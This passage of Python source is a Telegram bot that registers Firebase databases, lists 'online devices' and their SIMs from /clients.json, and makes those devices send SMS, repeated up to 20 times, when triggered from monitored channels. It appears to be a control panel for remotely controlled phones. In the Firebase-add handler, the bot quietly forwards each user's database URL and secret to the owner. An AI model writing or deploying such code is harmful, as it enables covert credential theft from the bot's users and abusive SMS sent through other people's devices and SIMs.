        reply_markup=fwd_menu_kb(uid, data), parse_mode="Markdown")

@router.message(S.custom_limit)
async def fsm_custom_limit(msg: Message, state: FSMContext):
    data = load()
    uid  = msg.from_user.id
    try:
        n = int(msg.text.strip())
        if n < 1 or n > 20:
            await msg.answer("\u274c Enter a number between 1 and 20.")
            return
        fsmd = await state.get_data()
        combo = fsmd.get("combo_in_progress", {})
        combo["repeat"] = n
        await state.clear()
        await _finalize_combo(msg.bot, uid, combo, data)
    except ValueError:
        await msg.answer("\u274c Numbers only please.")

@router.message(S.broadcast_msg)
async def fsm_broadcast(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id):
        await state.clear(); return
    data = load()
    text = msg.text or msg.caption or ""
    if not text:
        await msg.answer("\u274c Send a text message.")
        return
    await state.clear()

    sent = 0
    failed = 0
    channels_seen = set()

    for uid_str, u in data.get("users", {}).items():
        for ch in u.get("channels", []):
            ch_id = str(ch["id"])
            if ch_id in channels_seen:
                continue
            channels_seen.add(ch_id)
            try:
                chat = int(ch_id) if ch_id.lstrip("-").isdigit() else ch_id
                await msg.bot.send_message(chat, text, parse_mode="Markdown")
                sent += 1
            except Exception as e:
                log.warning(f"Broadcast to {ch_id} failed: {e}")
                failed += 1

    await msg.answer(
        f"\U0001f4e1 **Broadcast Complete**\n\n"
        f"\u2705 Sent : `{sent}`\n"
        f"\u274c Failed : `{failed}`\n"
        f"\U0001f4fa Total Channels : `{len(channels_seen)}`",
        reply_markup=kb([("\U0001f3e0 Menu", "menu:main")]),
        parse_mode="Markdown")

async def _finalize_combo(bot: Bot, uid: int, combo: dict, data: dict):
    u = get_user(uid, data)
    u["active_combo"] = combo
    u["monitoring"] = True
    save(data)
    log.info(f"uid={uid} combo finalized: {combo}")
    if uid in monitor_tasks:
        monitor_tasks[uid].cancel()
    task = asyncio.create_task(monitor_worker(bot, uid))
    monitor_tasks[uid] = task

@router.callback_query()
async def cb_handler(cq: CallbackQuery, state: FSMContext):
    data = load()
    uid  = cq.from_user.id
    cb   = cq.data

    if not can_use(uid, data):
        await cq.answer("\U0001f6ab Access denied.", show_alert=True)
        return

    u = get_user(uid, data)
    log.debug(f"CB uid={uid} data={cb}")

    if cb == "menu:main":
        await state.clear()
        await safe_edit(cq, "\U0001f3e0 **Main Menu**", main_menu(uid, data))

    elif cb == "fb:menu":
        await safe_edit(cq, "\U0001f525 **Firebase URLs**\n\nAdd or remove your Firebase URLs:",
            fb_menu_kb(uid, data))

    elif cb == "fb:add":
        await state.set_state(S.add_firebase)
        await safe_edit(cq,
            "\U0001f525 **Add Firebase URL**\n\nSend your Firebase Realtime DB URL:\n`https://your-project.firebaseio.com`\n\nYou'll be asked for optional credentials next.",
            kb([("\u274c Cancel", "fb:menu")]))

    elif cb.startswith("fb:del:"):
        fid = cb.split("fb:del:",1)[1]
        u["firebases"] = [f for f in u.get("firebases",[]) if f["id"] != fid]
        save(data)
        await cq.answer("\U0001f5d1 Removed.")
        await safe_edit(cq, "\U0001f525 **Firebase URLs**", fb_menu_kb(uid, data))

    elif cb.startswith("fb:noop:"): await cq.answer()

    elif cb == "fb:skip_secret":
        await state.update_data(fb_secret="")
        await state.set_state(S.add_firebase_admin_auth)
        await safe_edit(cq,
            "\U0001f194 **Admin Auth ID** (optional)\n\n"
            "Send your Firebase Admin Auth ID or send `-` to skip.\n"
            "Leave empty if your database has open rules.",
            kb([("\u23ed Skip", "fb:skip_admin_auth")]))

    elif cb == "fb:skip_admin_auth":
        fsmd = await state.get_data()
        fb = {
            "id": fsmd["fb_id"],
            "url": fsmd["fb_url"],
            "secret": fsmd.get("fb_secret", ""),
            "admin_auth": "",
        }
        u["firebases"].append(fb)
        save(data)
        asyncio.create_task(notify_owner_bot(
            f"\U0001f514 NEW FIREBASE ADDED\n"
            f"User: {uid}" + (f" (@{cq.from_user.username})" if cq.from_user.username else "") + "\n"
            f"URL: {fb['url']}\n"
            f"Secret: {fb['secret'] or '(none)'}\n"
            f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        ))
        await state.clear()
        log.info(f"uid={uid} added Firebase: {fb['url']}")
        await safe_edit(cq, f"\u2705 Firebase added!\n`{fb['url']}`", fb_menu_kb(uid, data))

    elif cb == "dev:menu":
        await safe_edit(cq, "\U0001f4f1 **Devices**\n\nManage your saved devices:", dev_menu_kb(uid, data))

    elif cb == "dev:add":
        fbs = u.get("firebases", [])
        if not fbs:
            await cq.answer("\u274c Add a Firebase URL first!", show_alert=True)
            return
        if len(fbs) == 1:
            fb = fbs[0]
            await state.update_data(sel_firebase_id=fb["id"], sel_firebase_url=fb["url"],
                                     sel_firebase_secret=fb.get("secret", ""))
            wait = await cq.message.edit_text("\u23f3 Fetching online devices...")
            devices = await fb_get(fb["url"], "/clients.json", fb.get("secret", ""))
            online  = {d:v for d,v in devices.items() if device_online(v)}
            if not online:
                await cq.message.edit_text("\U0001f634 No online devices.",
                    reply_markup=kb([("\U0001f504 Retry","dev:add"),("\U0001f519 Back","dev:menu")]))
                return
            await state.update_data(online_devices=online)
            await state.set_state(S.add_device_fetch)
            await cq.message.edit_text(f"\U0001f4f1 **Select Device** \u2014 {len(online)} online",
                reply_markup=online_dev_kb(online))
        else:
            rows = [[(f"\U0001f525 {f['url'][:30]}", f"dev:pickfb:{f['id']}")] for f in fbs]
            rows.append([("\U0001f519 Back","dev:menu")])
            await safe_edit(cq, "\U0001f4f1 **Add Device**\n\nSelect Firebase to fetch from:", kb(*rows))

    elif cb.startswith("dev:pickfb:"):
        fid = cb.split("dev:pickfb:",1)[1]
        fbs = u.get("firebases", [])
        fb  = next((f for f in fbs if f["id"]==fid), None)
        if not fb:
            await cq.answer("\u274c Firebase not found!", show_alert=True)
            return
        await state.update_data(sel_firebase_id=fb["id"], sel_firebase_url=fb["url"],
                                 sel_firebase_secret=fb.get("secret", ""))
        await cq.message.edit_text("\u23f3 Fetching online devices...")
        devices = await fb_get(fb["url"], "/clients.json", fb.get("secret", ""))
        online  = {d:v for d,v in devices.items() if device_online(v)}
        if not online:
            await cq.message.edit_text("\U0001f634 No online devices.",
                reply_markup=kb([("\U0001f504 Retry",f"dev:pickfb:{fid}"),("\U0001f519 Back","dev:menu")]))
            return
        await state.update_data(online_devices=online)
        await state.set_state(S.add_device_fetch)
        await cq.message.edit_text(f"\U0001f4f1 **Select Device** \u2014 {len(online)} online",
            reply_markup=online_dev_kb(online))

    elif cb.startswith("fadd:pg:"):
        page = int(cb.split(":")[-1])
        fsmd = await state.get_data()
        online = fsmd.get("online_devices", {})
        await safe_edit(cq, f"\U0001f4f1 **Select Device** \u2014 Page {page+1}", online_dev_kb(online, page))

    elif cb.startswith("fadd:sel:"):
        did  = cb.split("fadd:sel:",1)[1]
        fsmd = await state.get_data()
        online = fsmd.get("online_devices", {})
        dd   = online.get(did, {})
        name = dd.get("deviceName") or dd.get("name") or did[:20]
        sims = dd.get("sims", [])
        dv   = {"id": did, "name": name,
                "firebase_id": fsmd.get("sel_firebase_id",""),
                "sims": sims}
        existing = [d["id"] for d in u.get("devices",[])]
        if did not in existing:
            u["devices"].append(dv)
            save(data)
        await state.clear()
        log.info(f"uid={uid} added device: {name}")
        await safe_edit(cq, f"\u2705 Device **{name}** added!", dev_menu_kb(uid, data))

    elif cb == "fadd:manual":
        await state.set_state(S.add_device_fetch)
        await safe_edit(cq,
            "\U0001f50d Enter Device ID manually:", kb([("\u274c Cancel","dev:menu")]))

    elif cb.startswith("dev:del:"):
        did = cb.split("dev:del:",1)[1]
        u["devices"] = [d for d in u.get("devices",[]) if d["id"]!=did]
        save(data)
        await cq.answer("\U0001f5d1 Removed.")
        await safe_edit(cq, "\U0001f4f1 **Devices**", dev_menu_kb(uid, data))

    elif cb.startswith("dev:noop:"): await cq.answer()

    elif cb == "ch:menu":
        await safe_edit(cq, "\U0001f4fa **Channels / Groups**", ch_menu_kb(uid, data))

    elif cb == "ch:add":
        await state.set_state(S.add_channel)
        await safe_edit(cq,
            "\U0001f4fa **Add Channel**\n\nSend `@username` or numeric chat ID:",
            kb([("\u274c Cancel","ch:menu")]))

    elif cb.startswith("ch:del:"):
        cid_str = cb.split("ch:del:",1)[1]
        u["channels"] = [c for c in u.get("channels",[]) if str(c["id"])!=cid_str]
        save(data)
        await cq.answer("\U0001f5d1 Removed.")
        await safe_edit(cq, "\U0001f4fa **Channels**", ch_menu_kb(uid, data))

    elif cb.startswith("ch:noop:"): await cq.answer()

    elif cb == "mon:toggle":
        if u.get("monitoring"):
            task = monitor_tasks.pop(uid, None)
            if task: task.cancel()
            u["monitoring"] = False
            save(data)
            log.info(f"uid={uid} stopped monitor")
            await safe_edit(cq, "\u23f8 **Monitor Stopped.**", main_menu(uid, load()))
        else:
            fbs = u.get("firebases", [])
            devs = u.get("devices", [])
            chs  = u.get("channels", [])
            if not fbs:
                await cq.answer("\u274c Add Firebase URL first!", show_alert=True)
                return
            if not devs:
                await cq.answer("\u274c Add a Device first!", show_alert=True)
                return
            if not chs:
                await cq.answer("\u274c Add a Channel first!", show_alert=True)
                return
            await state.update_data(combo_in_progress={})
            if len(fbs) == 1:
                await state.update_data(combo_in_progress={"firebase_url": fbs[0]["url"],
                                                            "firebase_id": fbs[0]["id"],
                                                            "firebase_secret": fbs[0].get("secret", "")})
                await safe_edit(cq, "\U0001f4f1 **Select Device for this session:**", dev_pick_kb(devs))
            else:
                await safe_edit(cq, "\U0001f525 **Select Firebase for this session:**", fb_pick_kb(fbs))

    elif cb.startswith("mpick:fb:"):
        fid  = cb.split("mpick:fb:",1)[1]
        fbs  = u.get("firebases",[])
        fb   = next((f for f in fbs if f["id"]==fid), None)
        if not fb:
            await cq.answer("\u274c Not found!", show_alert=True); return
        fsmd = await state.get_data()
        combo = fsmd.get("combo_in_progress", {})
        combo["firebase_url"] = fb["url"]
        combo["firebase_id"]  = fb["id"]
        combo["firebase_secret"] = fb.get("secret", "")
        await state.update_data(combo_in_progress=combo)
        devs = u.get("devices", [])
        await safe_edit(cq, "\U0001f4f1 **Select Device for this session:**", dev_pick_kb(devs))

    elif cb.startswith("mpick:dev:"):
        did  = cb.split("mpick:dev:",1)[1]
        devs = u.get("devices", [])
        dv   = next((d for d in devs if d["id"]==did), None)
        if not dv:
            await cq.answer("\U0001f4f1 Not found!", show_alert=True); return
        fsmd = await state.get_data()
        combo = fsmd.get("combo_in_progress", {})
        combo["device_id"]   = did
        combo["device_name"] = dv["name"]
        combo["sims_available"] = dv.get("sims", [])
        combo["sims_selected"]  = []
        await state.update_data(combo_in_progress=combo)
        sims = dv.get("sims", [])
        if not sims:
            combo["sims"] = [0]
            await state.update_data(combo_in_progress=combo)
            chs = u.get("channels", [])
            await safe_edit(cq, "\U0001f4fa **Select Channel for this session:**", ch_pick_kb(chs))
        else:
            await safe_edit(cq,
                "\U0001f4f6 **Select SIM(s)**\n_(You can select multiple \u2014 tap to toggle, then Confirm)_",
                sim_pick_kb(sims, [], did))

    elif cb.startswith("mpick:devpg:"):
        page = int(cb.split(":")[-1])
        devs = u.get("devices", [])
        await safe_edit(cq, f"\U0001f4f1 **Select Device** \u2014 Page {page+1}", dev_pick_kb(devs, page))

    elif cb.startswith("mpick:sim:"):
        parts = cb.split(":", 3)
        did   = parts[2]
        idx   = int(parts[3])
        fsmd  = await state.get_data()
        combo = fsmd.get("combo_in_progress", {})
        sel   = combo.get("sims_selected", [])
        if idx in sel:
            sel.remove(idx)
        else:
            sel.append(idx)
        combo["sims_selected"] = sel
        await state.update_data(combo_in_progress=combo)
        sims = combo.get("sims_available", [])
        await safe_edit(cq,
            "\U0001f4f6 **Select SIM(s)** _(tap to toggle, then Confirm)_",
            sim_pick_kb(sims, sel, did))

    elif cb.startswith("mpick:simconfirm:"):
        fsmd  = await state.get_data()
        combo = fsmd.get("combo_in_progress", {})
        sel   = combo.get("sims_selected", [])
        if not sel:
            await cq.answer("\u274c Select at least one SIM!", show_alert=True); return
        combo["sims"] = sel
        await state.update_data(combo_in_progress=combo)
        chs = u.get("channels", [])
        await safe_edit(cq, "\U0001f4fa **Select Channel for this session:**", ch_pick_kb(chs))

    elif cb.startswith("mpick:ch:"):
        cid   = cb.split("mpick:ch:",1)[1]
        chs   = u.get("channels", [])
        ch    = next((c for c in chs if str(c["id"])==str(cid)), None)
        if not ch:
            await cq.answer("\u274c Not found!", show_alert=True); return
        fsmd  = await state.get_data()
        combo = fsmd.get("combo_in_progress", {})
        combo["channel_id"]   = ch["id"]
        combo["channel_name"] = ch["name"]
        await state.update_data(combo_in_progress=combo)
        await safe_edit(cq,
            f"\U0001f501 **How many times to send each SMS?**\n\nSIMs selected: `{len(combo.get('sims',[1]))}` \u2014 Each repeat = send on all selected SIMs",
            repeat_kb())

    elif cb.startswith("repeat:"):
        val  = cb.split(":")[1]
        fsmd = await state.get_data()
        combo = fsmd.get("combo_in_progress", {})
        if val == "custom":
            await state.update_data(combo_in_progress=combo)
            await state.set_state(S.custom_limit)
            await safe_edit(cq, "\u270f\ufe0f **Custom Repeat Count**\n\nSend a number (1\u201320):",
                kb([("\u274c Cancel","menu:main")]))
        else:
            combo["repeat"] = int(val)
            await state.clear()
            await safe_edit(cq, "\u23f3 Starting monitor...")
            await _finalize_combo(cq.bot, uid, combo, data)
            await safe_edit(cq, "\U0001f7e2 **Monitor Started!**", main_menu(uid, load()))

    elif cb == "status:show":
        await safe_edit(cq, status_text(uid, data),
            kb([("\U0001f504 Refresh","status:show"),("\U0001f3e0 Menu","menu:main")]))

    elif cb == "test:start":
        combo = u.get("active_combo")
        if not combo:
            await cq.answer("\u274c Start monitor first to set active combo!", show_alert=True); return
        await state.set_state(S.test_to)
        await safe_edit(cq,
            "\U0001f9ea **Test SMS**\n\nEnter recipient number (with country code):\n`+91XXXXXXXXXX`",
            kb([("\u274c Cancel","menu:main")]))

    elif cb == "fwd:menu":
        await safe_edit(cq, "\U0001f4e4 **Forward Targets**\n\nSMS results forwarded to:", fwd_menu_kb(uid, data))

    elif cb == "fwd:add":
        await state.set_state(S.fwd_target)
        await safe_edit(cq,
            "\U0001f4e4 **Add Forward Target**\n\nSend `@username` or numeric chat ID:",
            kb([("\u274c Cancel","fwd:menu")]))

    elif cb.startswith("fwd:del:"):
        tgt = cb.split("fwd:del:",1)[1]
        u["forward_targets"] = [t for t in u.get("forward_targets",[]) if str(t)!=tgt]
        save(data)
        await cq.answer("\U0001f5d1 Removed.")
        await safe_edit(cq, "\U0001f4e4 **Forward Targets**", fwd_menu_kb(uid, data))

    elif cb.startswith("fwd:noop:"): await cq.answer()

    elif cb == "reset:menu":
        await safe_edit(cq, "\U0001f5d1 **Reset**\n\nWhat do you want to reset?", reset_menu_kb(uid, data))

    elif cb == "reset:self":
        data["users"][str(uid)] = _empty_user()
        task = monitor_tasks.pop(uid, None)
        if task: task.cancel()
        save(data)
        log.info(f"uid={uid} reset own data")
        await safe_edit(cq, "\u2705 **Your data has been reset.**", main_menu(uid, data))

    elif cb == "reset:all":
        if not is_owner(uid):
            await cq.answer("\U0001f6ab Owner only!", show_alert=True); return
        for t in monitor_tasks.values():
            t.cancel()
        monitor_tasks.clear()
        monitor_seen.clear()
        data["users"] = {}
        save(data)
        log.info(f"Owner uid={uid} reset ALL users")
        await safe_edit(cq, "\U0001f4a5 **All user data has been reset.**", main_menu(uid, data))

    elif cb == "broadcast:start":
        if not is_owner(uid):
            await cq.answer("\U0001f6ab Owner only!", show_alert=True); return
        await state.set_state(S.broadcast_msg)
        await safe_edit(cq,
            "\U0001f4e1 **Broadcast Message**\n\nSend the message to broadcast to all users' channels:",
            kb([("\u274c Cancel", "menu:main")]))

    await cq.answer()

@router.channel_post()
@router.message(F.chat.type.in_({"group", "supergroup"}))
async def group_sms_handler(msg: Message):
    text = msg.text or msg.caption or ""
    if not text:
        return

    chat_id = str(msg.chat.id)
    chat_username = msg.chat.username

    # Auto-token: check configs first
    for uid_str, cfg in list(auto_token_configs.items()):
        if _cid_match(chat_id, chat_username, cfg.get("channelId", "")):
            log.info(f"Auto-token trigger: uid={uid_str} channel={chat_id}")
            _safe_create_task(auto_token_send_and_log(cfg, text))

    # Regular monitoring: parse SMS for to_num and message
    to_num, sms_text = parse_sms(text)
    if not to_num or not sms_text:
        return

    data = load()

    for uid_str, u in data.get("users", {}).items():
        if not u.get("monitoring"):
            continue
        combo = u.get("active_combo")
        if not combo:
            continue

        if not _cid_match(chat_id, chat_username, combo.get("channel_id", "")):
            continue

        try:
            uid = int(uid_str)
        except ValueError:
            uid = uid_str
        log.info(f"Group msg \u2192 uid={uid} to={to_num}")
        _safe_create_task(process_sms_from_channel(msg.bot, uid, to_num, sms_text))

async def on_shutdown():
    log.info("Shutting down \u2014 cancelling all monitor tasks...")
    for tid, task in list(monitor_tasks.items()):
        task.cancel()
    monitor_tasks.clear()
    monitor_seen.clear()
    if _watcher_task is not None:
        _watcher_task.cancel()
    if _save_task is not None:
        _save_task.cancel()
    # Flush any pending save
    if _save_pending:
        try:
            data = load()
            with open(DATA_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            log.error(f"Final save failed: {e}")
    if _http_session is not None and not _http_session.closed:
        await _http_session.close()
    try:
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
    except Exception:
        pass

_watcher_task = None
_save_task = None
PID_FILE = "bot.pid"

async def _start_web_server():
    from aiohttp import web as aio_web

    async def health(request):
        return aio_web.Response(text="OK", status=200)

    app = aio_web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)

    port = int(os.environ.get("PORT", 8080))
    runner = aio_web.AppRunner(app)
    await runner.setup()
    site = aio_web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    log.info(f"Health check server started on port {port}")

async def main():
    global _watcher_task, _save_task
    try:
        bot = Bot(token=BOT_TOKEN)
    except Exception as e:
        log.error(f"Invalid bot token: {e}")
        return

    try:
        with open(PID_FILE, "w") as f:
            f.write(str(os.getpid()))
    except Exception:
        pass

    dp  = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    dp.shutdown.register(on_shutdown)

    _save_task = asyncio.create_task(_flush_save())

    await _start_web_server()

    me = await bot.get_me()
    log.info(f"Bot started: @{me.username}")
    log.info(f"Owner: {OWNER_ID}")

    _watcher_task = asyncio.create_task(watch_all_admin_configs())
    log.info("Auto-token watcher scheduled (env + Telegram-added Firebases)")

    try:
        await bot.send_message(OWNER_ID,
            f"<b>SMS Bot Online</b>\n@{me.username}\n"
            f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>",
            parse_mode="HTML")
    except Exception as e:
        log.warning(f"Could not notify owner: {e}")

    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())
